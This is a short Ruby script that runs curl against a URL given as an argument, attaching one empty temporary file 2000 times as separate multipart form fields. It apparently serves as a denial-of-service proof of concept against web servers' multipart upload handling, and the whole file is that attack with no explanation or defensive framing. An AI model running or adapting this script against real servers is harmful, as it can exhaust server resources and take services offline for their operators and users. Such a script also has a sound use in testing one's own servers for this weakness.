#!/usr/bin/env ruby
#
require "tempfile"
f = Tempfile.new("0")

`curl #{2000.times.map {|i| "-F file#{i}=@#{f.path}"}.join(" ")} #{ARGV.first}`
